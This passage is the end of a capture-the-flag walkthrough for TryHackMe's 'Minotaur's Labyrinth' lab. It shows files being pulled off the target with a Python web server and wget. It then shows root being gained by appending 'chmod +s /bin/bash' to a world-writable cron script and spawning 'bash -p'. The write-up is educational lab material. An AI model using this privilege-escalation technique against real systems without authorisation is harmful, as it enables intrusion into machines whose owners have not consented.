daemon@labyrinth:/opt/lampp/htdocs$ ^C
daemon@labyrinth:/opt/lampp/htdocs$ 
```

**Flag3:**
```
daemon@labyrinth:/opt/lampp/htdocs$ cat /home/user/flag.txt
fla9{Redacted}
```

# Privilege Escalation

## daemon to root

**/opt/lampp/htdocs/dbConnect.php:**
```php
<?php
    
    $servername = "localhost";
    $db = "labyrinth";
    $usr = "root";
    $pwd = "";
    //$pwd = "{Redacted}";
    try {
        $conn = new PDO("mysql:host=$servername;dbname=$db", $usr, $pwd);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        
    } catch (PDOException $e) {     
        die();
    }

?>
```

Found MySQL credentials!

In `minotaur`'s `pictures` directory, there are some screenshots:

```
daemon@labyrinth:/home/minotaur/Pictures$ ls -lah
[...]
-rw-rw-r--  1 minotaur minotaur 131K szept 13  2021 'Screenshot from 2021-09-13 21-20-37.png'
-rw-rw-r--  1 minotaur minotaur 149K szept 13  2021 'Screenshot from 2021-09-13 21-46-44.png'
-rw-rw-r--  1 minotaur minotaur  86K szept 22  2021 'Screenshot from 2021-09-22 12-46-44.png'
-rw-rw-r--  1 minotaur minotaur  67K okt   26  2021 'Screenshot from 2021-10-26 15-41-08.png'
```

Let's transfer them!

```
daemon@labyrinth:/home/minotaur/Pictures$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# wget http://$RHOSTS:8000/'Screenshot from 2021-09-13 21-20-37.png'

┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# wget http://$RHOSTS:8000/'Screenshot from 2021-09-13 21-46-44.png'

┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# wget http://$RHOSTS:8000/'Screenshot from 2021-09-22 12-46-44.png'

┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# wget http://$RHOSTS:8000/'Screenshot from 2021-10-26 15-41-08.png'
```

**Screenshot from 2021-09-13 21-20-37.png:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/screenshot1.png)

**Screenshot from 2021-09-13 21-46-44.png:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/screenshot2.png)

**Screenshot from 2021-09-22 12-46-44.png:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/screenshot3.png)

**Screenshot from 2021-10-26 15-41-08.png:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/screenshot4.png)

```
daemon@labyrinth:/opt/lampp/htdocs$ cat .htaccess
[...]
<Files "/opt/lampp/htdocs/logs/file.txt">
[...]

daemon@labyrinth:/opt/lampp/htdocs$ ls -lah logs/
[...]
drwxr-xr-x 2 root root 4,0K okt   11  2021 post

daemon@labyrinth:/opt/lampp/htdocs$ ls -lah logs/post/
[...]
-rw-r--r-- 1 root root  760 okt   11  2021 post_log.log
```

**/opt/lampp/htdocs/logs/post/post_log.log:**
```
daemon@labyrinth:/opt/lampp/htdocs$ cat logs/post/post_log.log 
POST /minotaur/minotaur-box/login.php HTTP/1.1
[...]
Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhv
Connection: close

email=Daedalus&password={Redacted}
```

Nothing useful in `post_log.log`.

The `Screenshot from 2021-09-22 12-46-44.png` looks like user `minotaur` has some `sudo` permission which could be abused to escalate to root!

But how do we login as `minotaur`? I tried password reuse, but no dice, maybe it's a rabbit hole.

Anyways, in the root of the Linux file system (`/`), the `reminders` and `timers` are **not the default directory** in Linux:

```
daemon@labyrinth:/$ ls -lah
[...]
drwxr-xr-x   2 root root 4,0K jún   15  2021 reminders
[...]
drwxrwxrwx   2 root root 4,0K jún   15  2021 timers

daemon@labyrinth:/reminders$ ls -lah
[...]
-rw-r--r--  1 root root  42K szept  9 10:12 dontforget.txt
```

**/reminders/dontforget.txt:**
```
dont fo...forge...tttTEST
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
[...]
```

Not sure what is it.

```
daemon@labyrinth:/timers$ ls -lah
total 12K
drwxrwxrwx  2 root root 4,0K jún   15  2021 .
drwxr-xr-x 26 root root 4,0K nov    9  2021 ..
-rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh
```

**/timers/timer.sh:**
```bash
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
```

Ohh! There must be a cronjob is running this Bash script! And, the most importantly, the `timer.sh` script is **world-writable**!! Which means we can escalate to root!

We can modify the Bash script into **adding a SUID set bit to `/bin/bash`**:

```
daemon@labyrinth:/timers$ echo "chmod +s /bin/bash" >> timer.sh

daemon@labyrinth:/timers$ cat timer.sh 
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
chmod +s /bin/bash
```

Now **wait for the cronjob runs**:

```
daemon@labyrinth:/timers$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1,1M jún    7  2019 /bin/bash
```

We can confirm the script is being ran by issuing `ls -lah /bin/bash`. If you see there is a **`s` sticky bit**, that means the script is **successfully executed**.

Now, we spawn a SUID privilege bash shell!

```
daemon@labyrinth:/timers$ /bin/bash -p
bash-4.4# whoami;hostname;id;ip a
root
labyrinth
uid=1(daemon) gid=1(daemon) euid=0(root) egid=0(root) groups=0(root),1(daemon)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:9d:55:2f:26:31 brd ff:ff:ff:ff:ff:ff
    inet 10.10.92.1/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2260sec preferred_lft 2260sec
    inet6 fe80::9d:55ff:fe2f:2631/64 scope link 
       valid_lft forever preferred_lft forever
```

And we're root! :D

# Rooted

**Flag4:**
```
bash-4.4# cat /root/da_king_flek.txt
fL4G{Redacted}
```

# Conclusion

What we've learned:

1. Reverse Enigineering Javascript
2. Union-Based SQL Injection
3. Command Injection
4. Filter Bypass
5. Privilege Escalation via Misconfigured Bash Script & Cronjob